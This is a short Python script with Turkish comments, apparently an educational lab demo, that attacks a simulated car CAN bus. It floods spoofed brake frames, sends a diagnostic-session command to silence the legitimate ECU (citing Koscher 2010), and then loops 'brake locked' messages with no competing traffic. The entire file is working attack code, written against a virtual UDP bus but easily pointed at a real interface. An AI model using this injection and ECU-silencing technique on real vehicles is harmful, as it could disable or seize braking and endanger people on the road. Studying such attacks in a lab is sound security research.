// Saldırgan

import can
import time

def attack():
    bus = can.interface.Bus(interface='udp_multicast', channel='default')
    print("SALDIRGAN: Sistem hazır. Saldırı başlatılıyor...")
    time.sleep(2)

    # --- AŞAMA 1: ÇELİŞKİ YARATMA (Conflict) ---
    print("\n--- AŞAMA 1: Mesaj Enjeksiyonu (Çelişki Yaratılıyor) ---")
    # Meşru ECU "0x00" gönderirken, biz araya "0xFF" (Fren Yap) sıkıştırıyoruz.
    for _ in range(20):
        fake_msg = can.Message(arbitration_id=0x100, data=[0xFF], is_extended_id=False)
        bus.send(fake_msg)
        time.sleep(0.05) # Hızlı gönderim
    
    print(">> Dashboard'a bak: Hem 'Güvenli' hem 'Tehlike' mesajları karışık geliyor olmalı.")
    time.sleep(2)

    # --- AŞAMA 2: ECU SUSTURMA (Silencing) ---
    print("\n--- AŞAMA 2: Meşru ECU'yu Susturma (Diagnostic Kill) ---")
    # Koscher (2010) makalesindeki "Diagnostic Session" açığı.
    kill_msg = can.Message(arbitration_id=0x7E0, data=[0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=False)
    bus.send(kill_msg)
    print(">> 'Susturma' komutu gönderildi!")
    time.sleep(1)

    # --- AŞAMA 3: TAM KONTROL (Dominance) ---
    print("\n--- AŞAMA 3: Tam Kontrol (Fiziksel Manipülasyon) ---")
    print(">> Meşru ECU sustu. Artık ağda sadece bizim sahte mesajlarımız var.")
    
    try:
        while True:
            # Artık sadece BİZİM mesajımız var, çelişki yok. Sistem bunu gerçek sanacak.
            fake_msg = can.Message(arbitration_id=0x100, data=[0xFF], is_extended_id=False)
            bus.send(fake_msg)
            print("SALDIRIYOR: Fren Kilitlendi Mesajı Gönderiliyor...")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("Saldırı durduruldu.")

if __name__ == "__main__":
    attack()